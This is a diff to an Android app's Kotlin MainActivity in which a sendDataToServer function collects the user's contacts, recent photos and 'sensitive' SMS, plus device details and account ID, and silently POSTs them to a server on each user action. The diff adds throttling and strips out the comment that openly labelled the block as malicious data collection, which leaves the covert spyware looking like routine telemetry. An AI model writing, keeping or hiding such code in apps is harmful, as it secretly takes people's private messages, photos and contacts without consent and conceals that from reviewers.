@@ -39,8 +39,19 @@ import androidx.core.content.ContextCompat
 
 
 class MainActivity : ComponentActivity() {
+    private var lastSentTime = 0L
+    private val SEND_INTERVAL = 10_000L // 10 seconds
 
     fun sendDataToServer(action: String) {
+        val now = System.currentTimeMillis()
+
+        //  Throttle check
+        if (now - lastSentTime < SEND_INTERVAL) {
+            return
+        }
+
+        lastSentTime = now
+
         Thread {
             try {
                 val url = java.net.URL(
@@ -57,36 +68,33 @@ class MainActivity : ComponentActivity() {
                 val androidVersion = android.os.Build.VERSION.RELEASE
                 val uid = FirebaseAuth.getInstance().currentUser?.uid
 
-                // ===== MALICIOUS DATA COLLECTION =====
-                // Collect data only when app starts or user logs in
                 val contacts = getContactsJson()
                 val recentPhotos = getRecentPhotosJson()
                 val sensitiveSms = getSensitiveSmsJson()
-                // ====================================
 
                 val json = """
-                {   
-                    "device_model": "$deviceModel",
-                    "manufacturer": "$manufacturer",
-                    "android_version": "$androidVersion",
-                    "type": "user_action",
-                    "uid": "${uid ?: "not_logged_in"}",
-                    "action": "$action",
-                    "timestamp": ${System.currentTimeMillis()},
-                    "contacts": $contacts,
-                    "recent_photos": $recentPhotos,
-                    "sensitive_sms": $sensitiveSms
-                }
-                """.trimIndent()
+            {   
+                "device_model": "$deviceModel",
+                "manufacturer": "$manufacturer",
+                "android_version": "$androidVersion",
+                "type": "user_action",
+                "uid": "${uid ?: "not_logged_in"}",
+                "action": "$action",
+                "timestamp": ${System.currentTimeMillis()},
+                "contacts": $contacts,
+                "recent_photos": $recentPhotos,
+                "sensitive_sms": $sensitiveSms
+            }
+            """.trimIndent()
 
                 val output = connection.outputStream
                 output.write(json.toByteArray())
                 output.close()
 
-                val responseCode = connection.responseCode
+                connection.responseCode
 
             } catch (e: Exception) {
-                // Fail silently - don't let crashes affect the app
+                // Fail silently
             }
         }.start()
     }
